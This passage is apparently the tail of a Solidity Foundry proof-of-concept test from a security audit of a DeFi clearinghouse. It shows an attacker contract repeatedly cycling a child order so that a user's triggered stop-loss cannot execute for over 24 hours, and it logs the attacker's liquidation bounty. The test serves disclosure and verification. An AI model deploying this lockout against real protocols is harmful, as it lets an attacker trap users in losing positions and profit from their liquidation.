        emit log_named_decimal_uint("Alice settlement balance when the stop triggered", aliceBalanceAtTrigger, 6);
        emit log_named_decimal_uint(
            "attack: Alice settlement balance after liquidation", clearinghouse.balanceAssets(ALICE), 6
        );
        emit log_named_decimal_uint(
            "attacker liquidation bounty", clearinghouse.balanceAssets(ATTACKER) - attackerBefore, 6
        );
    }

    /// @notice The same lockout sustained for more than 24 hours with one attacker transaction per 60 s window.
    ///         Alice's exits are asserted on every 100th attacker transaction to keep the test within the gas limit.
    function test_Poc_LockoutCanBeSustainedFor24Hours() public {
        locker = new RetryLocker();
        (uint64 protectionId,) = _armAliceStopLoss();
        uint64 childOrderId = _triggerAt(protectionId, GAP_PRICE);
        uint256 lockStart = vm.getBlockTimestamp();

        uint256 cycles;
        while (vm.getBlockTimestamp() < lockStart + 24 hours + 60) {
            uint64 deadline = router.lifecycleBook().orderTiming(childOrderId).executionDeadline;
            vm.roll(vm.getBlockNumber() + 1);
            vm.warp(uint256(deadline) + 1);
            vm.prank(ATTACKER);
            (, childOrderId) =
                locker.cycle(address(router), address(protectionBook), childOrderId, protectionId, new bytes[](0));
            if (cycles % 100 == 0) {
                _assertAliceHasNoExit(protectionId);
            }
            ++cycles;
        }

        _assertAliceHasNoExit(protectionId);
        assertEq(uint8(_status(protectionId)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
        (uint256 sizeWhileLocked,,,,,,) = engine.positions(ALICE);
        assertEq(sizeWhileLocked, POSITION_SIZE, "Alice is still in the full position");
        assertGt(vm.getBlockTimestamp() - lockStart, 24 hours, "lockout exceeds 24 hours");
        emit log_named_uint("attacker transactions", cycles);
        emit log_named_uint("seconds Alice has been locked out", vm.getBlockTimestamp() - lockStart);
    }

}
```

